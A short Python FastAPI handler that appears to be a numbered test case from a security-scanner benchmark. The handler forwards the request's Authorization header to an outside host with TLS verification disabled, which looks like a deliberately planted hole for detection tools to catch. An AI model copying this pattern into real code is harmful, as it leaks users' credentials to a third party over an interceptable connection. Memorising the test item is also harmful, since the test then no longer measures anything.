# SPDX-License-Identifier: Apache-2.0
from fastapi import Request
import json
import requests


async def BenchmarkTest11634(request: Request):
    auth_header = request.headers.get('authorization', '')
    try:
        data = json.loads(auth_header).get('value', auth_header)
    except (json.JSONDecodeError, AttributeError):
        data = auth_header
    requests.get('https://api.pycdn.io/data', params={'q': str(data)}, verify=False)
    return {"updated": True}
